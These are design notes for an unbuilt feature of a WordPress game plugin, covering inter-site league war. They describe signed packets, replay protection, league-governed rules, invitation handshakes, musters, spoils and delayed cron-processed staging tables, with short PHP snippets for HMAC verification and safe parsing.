# Phase 2: inter-site war (design notes, not implemented)

The goal is to let the empires of one WordPress site combine their forces and march on a game
hosted by a *different* WordPress site, with each site keeping authority over its own empires.

Nothing here is built yet. These are the questions that have to be answered first, written down
while the Phase 1 design is fresh.

## The hard part is not the transport

Whether a war packet travels by HTTPS request or by email to a dedicated game mailbox, the same
four problems have to be solved. Email is attractive because it needs no inbound firewall rule on
either site; it is also slow, silently lossy, and trivially forged unless every packet is signed.
The recommendation is to design the packet so that the transport is interchangeable, and to build
the HTTPS path first because it can be tested synchronously.

**1. Authenticity.** A packet must prove it came from the site it claims. Give each pair of sites
a shared secret established once, out of band, by the two administrators. Sign the canonical JSON
body with HMAC-SHA256 and reject anything whose signature does not verify, before parsing the
body any further. Never accept a packet whose secret arrived in the packet itself.

**2. Replay.** A valid packet captured and sent twice must not sack the same empire twice. Every
packet carries a UUID, a timestamp and a monotonically increasing sequence number per sending
site. The receiver stores processed UUIDs, rejects anything older than a short window (say 15
minutes), and rejects a sequence number it has already seen. Processing must be idempotent even
if the same packet is somehow delivered twice at once, so record the UUID in the same guarded
write that applies the effect.

**3. Authority.** A sending site may only speak for its own empires, and may only assert that a
force *left*. The receiving site decides what that force accomplishes: it owns the defender's
numbers and runs the combat maths. A packet that says "you lost 400 acres" is never trusted; a
packet that says "Vaelmark sent 800 centurions and 40 ballistae legions" is. The result travels back as a
second packet, and the sending site applies casualties only when it arrives.

**4. Settlement.** Losses on the attacking side are only known after the defender resolves the
battle, so the attacking empire's troops must be held in escrow from the moment the packet is sent
until the result comes back, and released with a timeout if it never does. This is the piece that
Phase 1 deliberately avoids by resolving everything locally and instantly.

## The league owns the rules, not the sites

A site that grants its rulers 200 turns a day, or founds empires with ten times the starting
gold, wins a league without ever fighting well. Every setting that affects the game has to be the
league's to set, not each site's.

**Two classes of setting.** Cosmetic ones stay local: the world name, page titles, whether new
empires may be founded. Game-affecting ones are league-governed and identical everywhere:

- turns per day, the turn cap, starting turns
- every starting resource, and the starting land
- explore yield and cost, build cost, training costs
- the conquest share, target bands, hits per target, truce length
- agent cost and the agent limit
- market tax and round length

**Distribute, then verify.** The hub holds the league ruleset and sends it with the pairing
handshake. A member site stores it and shows those settings read-only in the admin, marked as set
by the league, so there is nothing to argue about locally.

Distribution alone is not enough, because a site can change its copy back. Every packet therefore
carries a **rules fingerprint**: a hash of the governed settings in a fixed order. The hub
compares it against the league's own and refuses packets that do not match, naming the setting
that differs. A site that has drifted is told why it is being ignored rather than silently losing.

**The fingerprint does not stop a determined cheat**, and it is important to be honest about that.
A site administrator owns their database and can set an empire's land to whatever they like without
touching a single setting. The fingerprint catches drift and misconfiguration, which is most of
it. Beyond that there are two defences worth having:

- **Plausibility checks at the hub.** Given the ruleset, there is a ceiling on how much an empire
  can grow between exchanges: so many turns, each worth so much income. An empire that gains more
  than the rules allow is flagged, and the hub can hold its packets for a human to look at.
- **Publish everything.** Every member's standings, visible to every member. Cheating that nobody
  can see is a problem; cheating in public is a short-lived one, because leagues are voluntary and
  a site that is obviously inflated gets dropped.

The honest summary is that league play is a **federation of people who broadly trust each other**,
with mechanisms that make accidental divergence impossible and deliberate cheating visible. It is
not, and cannot be, a system that makes a hostile host safe to play against.

## Where the code and the secrets live

The league code goes in `includes/league/` and is committed like the rest of the plugin. Keeping
it out of the repository would mean no history for the most security-sensitive part of the game,
which is exactly backwards.

**No secret is ever committed, including a placeholder.** A shared secret is generated at pairing
and stored in the `ido_sites` table; it never appears in a file, a constant or a default. A
default secret in a public repository is the classic way a federated system is broken: every
install shares one key and the repository tells an attacker what it is. If the pairing screen
needs a starting value, it generates one with `wp_generate_password()` and shows it once.

Packets are stored as text in `ido_packets`, not written to disk. That is a security decision
rather than a storage preference: nothing arriving from another site should ever become a file.

`.gitignore` carries entries for `league-local/`, `*.secret`, `*.key`, `*.pem` and `.env` files,
so local fixtures and captured packets used in testing cannot be committed by accident.

## Packet security

### Sign, do not encrypt

The instinct is to encrypt a packet so it cannot be tampered with. Encryption does not do that.
Encryption hides content; what we need is proof that a packet came from the peer and arrived
unaltered, which is **authentication**. They are different jobs and need different primitives.

Encryption without authentication is worse than none, because many ciphertexts are malleable: an
attacker who cannot read a packet can still flip bits in it and change what it says. Any design
that reasons "it is encrypted, therefore it cannot have been tampered with" is already broken.

So: **every packet is signed; encryption is optional and, for this game, unnecessary.** There is
nothing confidential in "Vaelmark sent 800 centurions": both ends know it, and the defender is about
to be told anyway. Signing alone buys integrity and origin, which is all the game needs.

    $signature = hash_hmac('sha256', $body, $secret);         // sending
    hash_equals($expected, $received_signature);              // verifying, timing-safe

`hash_equals()` rather than `===`, so the comparison does not leak the signature a byte at a time
through its timing.

If confidentiality is ever wanted, do not reach for a cipher directly. Use authenticated
encryption, which does both jobs in one primitive and is in PHP core:

    sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($json, $header, $nonce, $key);

Never AES-CBC with a hand-rolled MAC, never ECB, never a cipher without a tag.

### The secret

At least 32 bytes from `random_bytes()`, generated at pairing, exchanged out of band by the two
administrators, and stored in the `ido_sites` row. Never in a file, never in the repository, never
in a packet, and never the same for two peers.

Be honest about the limit: WordPress has no secret store. A secret in the database is readable by
anything with database access, which includes every other plugin on the site. Putting it in
`wp-config.php` as a constant moves it out of the database but into a file the web server can
read. Neither is a vault. This is a reason to keep the blast radius small, one secret per pairing,
and to make rotation easy.

### Verify before you parse

Order matters. Check the signature against the **raw received bytes** before any parser touches
them, so malformed input is rejected by a constant-time comparison rather than by a parser.

Sign the exact bytes that travel, and transmit them base64-encoded. Signing a re-serialised
structure invites canonicalisation bugs, where sender and receiver disagree about key order or
whitespace and every packet fails. Base64 also survives mail transports that would otherwise
re-wrap lines and break the signature.

### Parsing, with the assumption that the sender is hostile

    $data = json_decode($raw, true, 8, JSON_THROW_ON_ERROR);

- **JSON only, never `unserialize()`.** `unserialize()` on untrusted input is a remote code
  execution vector through object injection. `json_decode()` with `true` yields arrays and scalars
  only: no objects, nothing that can run.
- **Size cap before parsing**, 64 KB or so, and a depth cap as above. Both stop a small packet
  that expands into an enormous structure.
- **Whitelist every field**: name, type, range. Reject unknown keys rather than ignoring them, so
  a field added by an attacker is an error rather than a silent no-op.
- **Strings from a packet get the same character rules as an empire name**, and are escaped at
  output like everything else. A packet supplies names that end up in the gazette.
- **Numbers are clamped** through `IDO_Game::clamp()`, which already exists for the overflow work.
- Nothing from a packet is ever written to a file, used in a path or filename, included, evaluated,
  passed to a shell, or used to build SQL by concatenation.

### Replay, ordering and the deliberate delay

A valid packet captured and sent twice must not sack the same empire twice. Each packet carries a
UUID, a per-peer sequence number and a timestamp. The receiver records processed UUIDs and refuses
a repeat, in the same guarded write that applies the effect, so a duplicate arriving twice at once
cannot slip through between the check and the write.

The usual advice is a tight timestamp window, and that is wrong here: the design deliberately
delays packets three to eight days in each direction, so a window has to be long, three weeks
or so. The UUID record is what actually prevents replay; the timestamp only discards the absurdly
old.

### The receiving endpoint

**A registered REST route, not a PHP file in the plugin folder.**

    register_rest_route('ido/v1', '/packet', [
        'methods'             => 'POST',
        'callback'            => ['IDO_League_Endpoint', 'receive'],
        'permission_callback' => '__return_true',   // the signature is the gate
    ]);

A loose `receive.php` in the plugin directory is reachable on its own, has to bootstrap WordPress
by guessing at the path to `wp-load.php`, and runs before any of WordPress's protections exist.
That pattern is behind a long list of plugin vulnerabilities. A route runs with WordPress already
loaded, only answers the method it declares, and lives somewhere a reviewer can find.

`permission_callback` returning true deserves a comment in the code, because it looks like the
classic mistake. It is deliberate: the caller is another server, not a logged-in user, so there is
no cookie and no nonce to check. **The HMAC is the authentication.** What must never happen is the
opposite error of leaning on WordPress authentication here, which would mean a peer needed an
account.

Details that matter:

- **Verify the raw body.** `$request->get_body()` gives the bytes as received; that is what the
  signature covers. Never verify a re-serialised copy of the parsed parameters.
- **Send it as `text/plain`**, base64 of the JSON. With `application/json` WordPress parses the
  body into parameters before the handler runs, which is work done on unverified input.
- **Check the length first**, before verifying and long before parsing.
- **Do almost nothing synchronously.** Verify, record the packet as pending, return. The work
  happens on the next cron tick. A request that only writes one row is hard to abuse, cannot time
  out mid-battle, and leaves the packet available for inspection.
- **Answer in generalities.** A handler that explains *why* verification failed is an oracle for
  whoever is probing it. Log the detail locally; return a bare status.
- **A duplicate is a success, not an error.** If the UUID has been seen, return the same accepted
  status as the first time. Returning an error makes a sender retry forever.

Useful statuses: 202 accepted, 400 malformed, 401 signature failed, 413 too large, 429 too many.

One caveat worth knowing: security plugins and a few hosts disable or filter the REST API. If a
league member hits that, the fallback is `admin-post.php` with a `nopriv` action, which is equally
WordPress-loaded and equally unauthenticated by design. The endpoint logic should not care which
one delivered the bytes.


#### The routes, and what is not a service

Every member site runs the same plugin and exposes the same routes. There is **no central server
to host**: a site is both client and server, and the hub is simply one member carrying the league
ruleset, the calendar and the standings. If the hub is down, packets between other members still
move; only league administration pauses.

    POST   ido/v1/packet      a signed packet: war orders, results, news
    POST   ido/v1/join        enrolment, presenting a one-time invitation token
    POST   ido/v1/hello       echoes a nonce, so the hub can prove a joining site owns its domain
    GET    ido/v1/ruleset     the league ruleset and its version, for a member catching up
    GET    ido/v1/standings   hub only: a convenience mirror of the league table, never authoritative

That last one needs a caveat, because it is easy to read as a scoreboard server. It is not: every
site computes its own table from the packets it holds, as described under the league table, and the
hub's copy is a convenience for a member that has been offline, with exactly the same standing as
any other member's opinion. The hub does not arbitrate outcomes, and that includes the standings.

The namespace is versioned because the protocol will change. A site speaking `ido/v1` to a peer
that only offers `ido/v2` should be told so plainly rather than failing at the parser.

Outbound calls use `wp_remote_post()` with a short timeout, and failures are retried from the
queue on the next cron tick rather than in the request. A peer being slow or briefly offline must
never hold up a page load or lose a packet: the queue is the thing that makes the exchange robust,
and the delay means nobody notices a retry anyway.

None of this uses WordPress authentication. There are no cookies, no application passwords and no
user accounts between sites: the HMAC is the whole of it, which is why `permission_callback`
returns true and why that decision is commented where it sits.

The envelope stays transport-agnostic. If email is ever added, it carries the same signed bytes to
the same handler, and only the delivery differs.

### If the transport is email

Email is the more hazardous of the two options, and the reasons are worth stating:

- **The From header is decoration.** Anyone can forge it. The signature is the identity, and the
  envelope must never be trusted for anything.
- **Reading a mailbox means storing mailbox credentials** in WordPress, with the same no-vault
  problem as above, and those credentials are usually worth more than the game. Use a dedicated
  mailbox that can reach nothing else, and an app password where the provider supports one.
- **Anyone can email that address.** The handler must therefore treat every message as hostile
  input: size-cap, verify, then parse, and discard anything that fails at any step without
  attempting to be helpful about it.
- **Attachments are never processed.** The packet is base64 text in the body. Nothing arriving by
  mail is ever written to disk as a file.
- **Mail is lossy and reorders freely**, so retries and idempotency are mandatory rather than
  optional.

**HTTPS is the safer default**, and the earlier argument for email does not hold up: a WordPress
site is already a public web server, so there is no firewall rule to negotiate. A signed POST to a
REST route gives TLS in transit, a synchronous success or failure that makes retries deterministic,
no stored mailbox credentials, and no MIME layer to mangle a signature.

The envelope should be identical either way, so the transport stays a detail. Build HTTPS first
because it can be tested synchronously; add email afterwards as an alternative carrier if the
slower, patchier feel is wanted for its own sake.

## Founding a league

A league is created by one site, the **originator**, which is also the hub. It has a name, an id,
and a ruleset. Everything about fairness follows from the originator owning that ruleset and the
members accepting it.

### What the originator sets

- **Name and id.** The name is what players see: "the Westmarch League". The id is a UUID that
  never changes, so a rename does not orphan the members.
- **The member cap**, up to 20 sites. See the note on league size below.
- **The ruleset**, which is the game-affecting settings listed earlier: turns a day, turn cap,
  starting turns and resources, building and training costs, explore yield, combat percentages,
  target bands, truce length, agent cost and limit, market tax.
- **The round calendar**, which matters more than it sounds. See below.
- **Exchange cadence and the delay range**, the three to eight days, so every member waits the same.

Each ruleset carries a **version number**, bumped whenever the originator changes anything, and a
**fingerprint**, the hash that rides in every packet. A member running version 4 against a league
on version 5 is told which setting differs rather than silently losing.

### Rounds have to be synchronised, not merely the same length

Giving every site a 45-day round is not enough. If the sites start their rounds on different days,
a site whose round began last week fields mature empires against a site that wiped yesterday, and
it can keep doing so forever by timing its own resets.

**The league owns the round calendar**: length *and* start date. Members wipe together and begin
together. That also gives a league something worth having, a shared season with a shared ending,
and makes the Hall of Fame comparable across sites.

A site can still run local rounds on its own clock before joining a league. Joining means adopting
the league's calendar at the next boundary.

### Joining, and when the settings bite

The originator issues an invitation carrying the league id, the hub URL and a shared secret
exchanged out of band. The joining administrator enters it once; the hub confirms; the member
stores the ruleset and shows those settings read-only in the admin, marked as set by the league.

**League settings take effect at the start of the member's next round, not on joining.** Changing
turns a day or training costs under players who planned around them is unfair in a way that has
nothing to do with cheating, and a round is short enough to wait for. The exception is a setting
that only affects league play, which can apply at once because nothing local depends on it.

Leaving a league releases the settings back to local control at the next boundary, for the same
reason.

### What the hub does not get to do

The hub holds the ruleset and the calendar. It does **not** resolve battles, hold empires, or
arbitrate outcomes: the defending site always computes its own. A compromised hub should be able
to disrupt a league's schedule, which is annoying, rather than rewrite anyone's empire, which
would be fatal.

## Invitations: how a site actually joins

The naive version is to email a shared secret and have the other administrator paste it in. Do not
do that. Email is plaintext in transit, gets forwarded, and sits in archives and backups for years.
A long-term secret that has been through a mailbox should be considered public.

**What travels by email is a one-time enrolment token, not the secret.**

### The invitation

The originator generates an invitation and sends it however they like, email included. It is short
enough to paste and carries nothing worth stealing for long:

    league id     a UUID, so a rename never orphans anybody
    league name   for the joining administrator to recognise
    hub URL       where the joining site will call
    token         32 random bytes, single use, expiring in seven days

Encoded as base64 of that small JSON object, so it survives a mail client without being mangled.

A stolen token is worth little: it can be used once, expires quickly, and using it is visible. If
the real invitee finds the token already spent, that is a detected attack rather than a silent one.

### The handshake

1. The joining administrator pastes the invitation into their own admin screen.
2. Their site POSTs to the hub, presenting the token and its own site URL.
3. **The hub calls the claimed site back** on a known route with a nonce, and expects it echoed.
   This proves whoever is enrolling actually controls that site, so nobody can enrol
   `maddogproductions.online` without running it.
4. The hub marks the member **pending**, and the originator approves it in their admin. Two
   administrators agreeing is the point; an invitation alone should not be enough.
5. On approval the hub generates the long-term shared secret, at least 32 bytes from
   `random_bytes()`, and returns it **over TLS in the response to the joining site's own request**.
   It never travels by email and is never the thing a human copies.
6. The hub returns the ruleset, its version, and the round calendar with it. The token is spent.

The secret is per pairing, so a compromised member exposes its own link and nothing else.

### Leaving, removing, rotating

- **Rotation** is a new secret issued through the same approved channel, with a short overlap where
  both verify, because packets take days to arrive and in-flight ones signed with the old secret
  must still land.
- **Removal** stops new packets being accepted but must not strip an empire of an army sitting in
  escrow: in-flight results are honoured, or the escrow times out and the troops come home.
- A member that leaves returns to local settings at the next round boundary.

### How many sites in a league

The original inter-BBS games capped this at 254, a node id being a single byte. That is the ceiling
worth keeping, and it is far above the number a league should actually run. What can be reasoned
about:

- **Secrets stay linear** under hub-and-spoke: one per member, not one per pair. Ten sites is ten
  secrets, not forty-five.
- **The real limits are social and legible.** A league is people who broadly trust each other and
  who notice when a member's numbers look wrong. A standings table spanning thirty sites is noise
  nobody reads, and nobody watching means nobody catching.
- **Traffic is bounded by participation**, not membership, since only committed forces generate
  packets.

So the cap is a judgement, not a technical ceiling.

**The decision: a hard ceiling of 254 sites, with 20 as the recommended maximum and a far lower
default.** The 254 comes from the inter-BBS games this one descends from, where a node id was a
single byte; it is the number the software enforces, and everything below is advice about the
number a league should actually run. See *How many players, and how many sites* for the ceiling and
what it costs at the top end.

- `league_max_sites` is set by the originator and enforced by the hub at enrolment. A league that
  is full refuses a token with a clear reason rather than a generic failure, so an administrator
  is not left guessing.
- **20 is the recommended maximum**, not the default. A league that size is a real tournament:
  enough sites that the same two empires are not meeting every exchange, and enough standings to be
  worth reading. The software will let an originator go past it, up to 254, and should say what
  that costs rather than refuse.
- Somewhere around **8 to 12 is the comfortable middle**, and a first league is better small. It
  is easy to admit another site and awkward to ask one to leave.

Worth knowing before choosing 20: the limits that bite first are not technical. Secrets stay
linear, and traffic follows participation rather than membership, so the hub is not the problem. A
twenty-site league is hard because twenty administrators have to stay reachable, agree on a
ruleset, keep their crons running and notice when a member's numbers look wrong. Watching is what
keeps a league honest, and it does not scale as easily as the packets do.

## Calling a muster: who starts a war, and how

Everything below this point describes a march that is already assembled. This section covers what
happens before that: who chooses the target, what they can see when they choose it, and how an army
belonging to a dozen different rulers comes together in the first place.

It is worth recording what the inter-BBS original actually did, because it answers this directly.
The unit it called a *planet* is what this design calls a site: one board, one community of
players, one team in the league. Read planet as WordPress site throughout and the precedent
translates exactly.

A group attack was started by a player, not by the board's administrator, and often by the
strongest player or by an elected **BBS Coordinator**: a player representative for that board,
chosen by the votes of the players on it, holding league functions the others did not. Once one
player had started the attack, other barons joined it by committing part of their own military
before the nightly processing ran, and the game combined those contributions into a single
attacking force that fought as one normal attack. The important detail, and the one usually
misremembered, is that the force was assembled from the barons who chose to join, not from
everybody on the board automatically.

Two things follow. The first is that a player starts it, which settles the question below. The
second is that the assembly window was one processing cycle, because the boards ran a tick every
night and that was the only clock available. This design has to stretch that window, since the
players contributing are not all logged in on the same evening and the packet crosses the internet
rather than a nightly mail run, and the length of the stretch is the one number here with no
precedent behind it.

The surviving documentation of the inter-BBS rules, including the coordinator role and the group
attack, is at <https://andy5995.github.io/immortal-barons/inter-bbs/>.

### One muster at a time, called by a player

**Any ruler may call a muster, and a site may have only one open at a time.** Not the game master.
An administrator who is away for a week should not be able to stop the site from playing, and a
league war that only starts when an administrator logs in is a league that stops when one person
gets busy.

The site is small enough for this to work: twenty-five empires at most, who can see each other's
standings and read the same gazette. A muster is public from the moment it is called, and a bad
call is visible to everybody as it fails to attract an army.

Calling one is priced so it is not a whim:

- it costs turns, more than any local order
- **the caller must commit the first force**, which cannot be nothing, so nobody starts a war they
  are not personally in
- while it is open, no second muster can be called, so the cost of a frivolous one is the site's
  whole exchange for that stretch of days

Who may call is a league setting, because a league that finds this too loose can tighten it: **any
ruler** (the default), **the elected coordinator**, or **game master only**. The default is the
loose one on the reasoning that the failure mode of the loose setting is a muster nobody joins, and
the failure mode of the strict one is a site that cannot play.

### The coordinator, and whether to elect one

The original's answer was an elected coordinator, and it is a better answer than it first looks. A
site fighting a league war has a coordination problem that the game does not otherwise create: five
and twenty rulers who each hold part of one army, no way to talk except the gazette, and a decision
that is worth more if it is made once than if it is made loudly. Electing somebody to make it is a
reasonable thing for a board to want, and it gives a site an internal politics that costs nothing
to run.

If it is built, the shape that fits this game:

- **One coordinator per site per round**, elected by the rulers of that site, one vote each, most
  votes wins, ties broken by net worth and then by the earlier founding. A round boundary clears it,
  which matches everything else here and means a bad coordinator is temporary by construction.
- **The office is calling musters, and nothing else.** No command over other empires' armies, no
  share of anyone's spoils, no ability to commit troops that are not theirs. The moment the role
  can spend somebody else's army it becomes a way to lose a player.
- **A recall**, or a re-election at any point on a petition of some fraction of the site, because an
  elected officer who has stopped logging in is worse than no officer at all when the setting makes
  them the only one who can call a war.

Whether to build it is a judgement about the league rather than the code. The election is a screen,
a table and a tick; the risk is that it makes the site's ability to play depend on one player
remaining interested. So: **ship with any ruler able to call, and build the coordinator as the
setting a league can move to once it has played a season and knows whether it wants one.** A site
that never elects anybody still plays, which is the property worth protecting.

Until it exists, the strongest player calling the war is what will happen in practice anyway, which
is what happened on the boards too.

The game master keeps a veto rather than the initiative: they can cancel an open muster, which
returns every contribution intact, and the cancellation is recorded in the gazette with who did it.
That is the right shape for a moderation power. It stops the abuse without being the thing standing
between the site and a game.

### Choosing a target, and what a site knows about one

The caller picks from the league roster, not from a free-text field. For each member site the list
shows what the league already circulates in its news packets:

- the site's name and whether it is reachable
- how many empires are playing there
- the total net worth of the site, and the net worth of its largest empire
- **as of when**: the date of the news packet those numbers came from
- whether it is under a grace period, and until when, since a site under grace cannot be marched on
- the record between the two sites: marches sent, marches received, and how they went

That is enough to judge a target without being enough to plan against a defence, which is the line
to hold. Two things about it matter more than the list itself.

**The numbers are self-reported, and a site can lie.** A league member asserting its own strength
is not evidence, it is a claim signed by the claimant. A site that understates itself to look like
easy prey is running the oldest trick in the genre, and the design should not pretend otherwise. So
the figures are always shown with their as-of date, never as a live reading, and the only numbers a
site can fully trust about a peer are the ones it learned by fighting it. Displaying a stale,
possibly dishonest figure with an honest label on it is better than displaying a confident one, and
better than displaying nothing: it gives the caller a basis for judgement and tells them exactly
how much that basis is worth.

**Site size is not the whole picture anyway**, because what a march meets is what that site has
standing at home on the day it lands, which is a different number from its net worth and unknowable
in advance. A large site that has just sent its own army somewhere else is the softest target in
the league, and nothing in the roster will say so. That is the game.

### The muster window

Once called, the muster stays open for a fixed number of days, a league setting, **five by
default**. During that window any ruler on the site may contribute.

Contributing costs a small number of turns and **moves the committed troops and siege weapons into
escrow immediately**, not when the packet is sent. The same army cannot be pledged to a muster and
also stand in defence at home, and it should be obvious to the contributor that the cost has
already been paid. The exposure the escrow creates is the one described under *The army that is
away is really away*: it simply starts five days earlier.

**A contribution can be withdrawn while the muster is open**, returning the troops and forfeiting
the turns. Five days of commitment before the army even leaves is a long time to be held to a
decision made on the first day, and a site attacked locally during its own muster needs a way to
defend itself that is not "wait for the packet to come back in a fortnight". Once the muster
closes, nothing comes back until the result does.

When the window closes, one of two things happens:

- **The force meets the minimum and marches.** The packet is assembled, signed and sent, and
  everything from *The sequence* onward applies unchanged. The delay clock starts now.
- **It does not, and the muster fails.** Every contribution is returned intact, the turns stay
  spent, and the gazette records that the site called for a war and did not raise one. A league
  march by a token force is worse than no march: it feeds the target and teaches the site nothing.

The minimum is a league setting expressed as a share of the target's known strength rather than a
flat number, so it scales with what the site is trying to do.

### What this costs the calendar

The window is not free. It sits in front of a round trip that was already three to eight days out
and the same back, so from the call to the return is **eleven to twenty-one days** with the default
five-day muster. Against a 45-day round that is two exchanges; against the 90-day league round it
is four. This is the strongest argument yet for the longer league round, and the cutoff before the
end of a round has to include the window, not just the flight:

    $cutoff_days = $league['muster_days'] + 2 * $league['delay_max_days'];

A league that wants more exchanges per round shortens the muster before it shortens the delay. The
delay is the suspense and the muster is only logistics, so the muster is the cheaper thing to lose.

### Credit, and why it has to be visible during the window

The contribution record described under *Tracking what each empire contributed* is created when a
ruler commits, not when the packet is sent, and it is what the muster screen reads. While the
window is open, every ruler on the site can see who has pledged and how much, and that visibility
is doing real work: it is the only pressure available to get an army raised at all, in a game where
nobody is online at the same time as anybody else. A muster that showed nothing until it closed
would be a war called into silence.

When the result comes home, the same record splits the survivors and the spoils in proportion to
what each empire risked. It also feeds the standing of a ruler within their own site: marches
joined, forces committed and spoils earned are shown on the League screen beside the roster, and a
ruler who carried an exchange is named in the gazette when it returns. The spoils themselves are
the material reward and they land in the empire that earned them, where they count toward net worth
like anything else. The recognition is the other half, and on a board of twenty-five people who
have to be persuaded to hand over their legions, it is not the lesser half.

## League war: how a march between sites resolves

The shape, settled: a site marches on another site. Empires commit forces, the packet crosses,
the defending site resolves it, and a result packet comes home days later carrying survivors and
spoils. Strength decides it, and a strong defence turns the outcome around on the attacker. This
is the BRE inter-BBS idea, and the delay is the point.

Three decisions inside that shape change the game entirely, and they are worth making deliberately
rather than discovering.

### 1. Compare committed forces, not whole sites

Tempting to weigh site against site. It does not survive contact: a league with a fifty-empire
site and a five-empire site would never see a fair fight, and the small site would be farmed.

**The battle compares what was actually committed.** Site size only decides how much a site can
afford to send, which is a real advantage without being an automatic win. The maths is the one
Phase 1 already uses, `IDO_Military::attack()` over an explicit force array, with the committed
forces of every participating empire summed on each side.

### 2. Only what is committed is at risk

"A percentage of the assets of the site attacked" needs a sharper answer to the question *whose*.

Taking a slice of every empire on the losing site punishes players who never agreed to the war,
for a decision their administrator made. One ruler logs in to find their army thinner because
somebody else picked a fight. That is the fastest way to empty a league.

**Empires opt in by committing.** An empire that sends nothing neither gains nor loses. Spoils go
to the empires that contributed, in proportion to what they risked. The site is the banner; the
empires are the participants.

### 3. Spoils: the local tables, minus land

**A league march uses the same percentages as a local raid**, applied to the defending side rather
than to a single empire, with the same casualty rates on both armies:

| | Base | With the strength modifier |
| --- | --- | --- |
| Gold | 9% | 5.4 to 12.6% |
| Grain and iron | 7% each | 4.2 to 9.8% |
| Attacker losses | 7% winning, 18% losing | of the committed force |
| Defender losses | 6% losing, 3% repelling | of what stood in defence |

No separate league percentage, and in particular not a thirty percent take. One exchange should be
worth the wait without being able to gut a site, and a number matched to local play is one fewer
thing to balance twice.

**Land never moves between sites.** There is no coherent way to hand acres from an empire on one
WordPress install to an empire on another, and no need: the hardship lands anyway. A site that has
lost soldiers and peasants still holds all its acres and now has fewer people to work them, which
is a slower, more interesting punishment than losing the ground.

### What is actually captured

Gold, grain and iron transfer as plunder, exactly as locally.

**Siege weapons transfer as equipment**, and this is the prize that makes a league march worth
mounting. It also carries its own brake, because of a rule the local game already has: a siege
weapon needs a crew, five legionnaires each, and an unmanned weapon counts for nothing on attack or
defence. Captured ballistae therefore arrive as hardware, not as power. A site that wins a haul of
them still has to find the men, which costs gold, iron and population it may not have. The spoil is
real, the advantage is delayed, and nothing compounds the way an absorbed army would.

**Captured soldiers become peasants, not soldiers.** Prisoners put to work is the older and better
answer: the winner gets growth, which has to be trained into an army through the same costs
everyone else pays, and the loser can rebuild against it. Letting a winning side absorb the losing
side's legions directly is what turns a three-exchange league into a decided one, and the wide
delay makes that worse rather than better, since there is no time to recover between blows.

The net effect is the one worth having: you march for the engines and the treasury, you come home
with hardware and prisoners, and you have to invest before either becomes strength.

### The sequence

1. A ruler calls a muster against a chosen site and empires commit forces to it, over the days
   described under *Calling a muster*. Troops leave the army immediately and show as committed, so
   the same army cannot be pledged twice while a packet is in flight.
2. The packet is signed and sent, and the delay is applied at the receiving end so the sender
   cannot shorten it.
3. On the tick after the delay expires, the **defending site resolves the battle** against the
   defenders standing at that moment. Not at the moment of sending: the attacker commits blind,
   and that uncertainty is the feature.
4. A result packet returns, itself delayed. It carries survivors, spoils and a report.
5. The attacking site applies it on arrival, releases the escrow, and posts to the gazette. If the
   result never arrives, the escrow times out and the troops come home, on the reasoning that
   losing an army to a network failure is worse than the small chance of a double release.

### The army that is away is really away

Committing to a league march leaves the contributing empires weaker at home, for as long as the
packet is in flight. That is not a rule anybody added: the escrow exists so the same army cannot be
committed twice, and the exposure falls out of it. It is also the best thing about the mechanic,
and the reason a league march should feel like a decision rather than a click.

**The exposure is long.** Three to eight days out, a battle, then three to eight days back: an army
can be away for as much as sixteen days, and an empire that sent most of its legions is a soft
target for that whole time. Not only to other league sites, but to its own neighbours, who can see
the standings and can work out who has just marched.

Whether that is the right weight is a judgement to make after a round has been played, and there
are three levers if it turns out to be too harsh:

- **Cap the share an empire may commit**, say half its army, so nobody can strip themselves bare.
  Simple, and it keeps the decision without the ruin.
- **Return faster than you left.** The outbound delay is the suspense; the homeward leg does not
  have to match it. Three to eight out and two to four back would halve the exposure while keeping
  the wait that matters.
- **Leave it alone**, on the grounds that a site which empties its garrison to attack deserves what
  follows, and that neighbours punishing the over-committed is the league working as intended.

The instinct here is to leave it alone and watch. It is the kind of balance that reads as broken in
a spreadsheet and plays as tense, and the wrong fix applied early would remove the only reason
committing is interesting.

### On the wait, deliberately

The days of waiting were originally an artefact: dial-up, nightly mail runs, and packets that
moved when the modems did. Everyone who played those games remembers the wait as the best part
anyway, because not knowing is what made the result worth reading.

This design re-creates it on purpose, on hardware that could resolve the whole exchange in
milliseconds. That is worth writing down plainly, because a future maintainer looking at a three to
eight day sleep in a queue will reasonably assume it is a performance problem and try to fix it.
It is the feature. Removing it would leave a game that resolves instantly and means less.

### What stays true from the local game

The defender always computes their own outcome. The attacker's packet asserts only what left.
Both sites run the same maths because the ruleset fingerprint says so. Every write that applies a
result goes through the same guarded, clamped path as everything else, so nothing overflows and
nothing goes negative.

## One march a day, and staging tables

### The rate limit

A site may send **one war packet every 24 hours**. Not one per target: one, full stop. It makes a
league march a considered act rather than a tactic to spam, and it caps the damage a compromised
or hostile member can do to everyone else in a day.

In ordinary play the muster is the stricter limit anyway, since one open muster at a time means a
site cannot assemble two marches at once. This limit exists for the case the muster rules do not
cover: a member whose site has been compromised, or whose plugin has been modified, sending war
packets directly.

Two things have to be right for this not to deadlock the league.

**It is enforced by the receiver, not the sender.** A sending site that has been compromised will
ignore its own limit, so the check that matters is the defending site refusing a second war packet
from the same peer inside the window. The sending side enforces it too, but that is courtesy to
the player, not a control.

**Only war packets count.** Results, news, ruleset syncs and enrolment traffic are exempt and must
be, or a site attacked by three peers in one day could not answer any of them, and the league
would jam within a week. The limit is on *starting* a fight, never on finishing one.

The window is 24 hours from the last accepted war packet, recorded on the receiving side, which
means each receiver enforces it **per peer pair**: that is the only version a receiver can enforce
alone, since it sees only its own traffic. The stricter site-wide limit is a sending-side rule and
a muster rule. Be clear about the consequence: a compromised member can march on every peer in the
league on the same day, one packet each, and no receiver can see that pattern by itself. What
catches it is the league table, where a site that fought eight exchanges in a day is not subtle. A packet refused for the limit gets a distinct, honest response so the sender can tell it
apart from a signature failure, because this one is not an attack and the administrator needs to
know why the march did not land.

### Staging tables

Nothing arriving from another site is acted on when it arrives. It is verified, staged, and
processed later by cron, which is both how the delay is implemented and how the endpoint is kept
cheap and hard to abuse.

    ido_packets_in    id, league_id, peer_id, uuid, type, sequence, received_at,
                      process_after, status, payload, result_note
    ido_packets_out   id, league_id, peer_id, uuid, type, created_at, send_after,
                      attempts, last_attempt_at, status, payload

`status` on the inbound side moves through `staged`, `processed`, `rejected` and `expired`.
`process_after` carries the delay, three to eight days, **set by the receiver on arrival**. A sender
cannot shorten its own attack by lying about when it sent, because the clock that matters is the
defender's and it starts when the packet lands.

The outbound table is the retry queue: a peer that is slow or briefly down does not lose a packet
and does not hold up a page load. `attempts` and `last_attempt_at` back off; `send_after` carries
the outbound half of the delay.

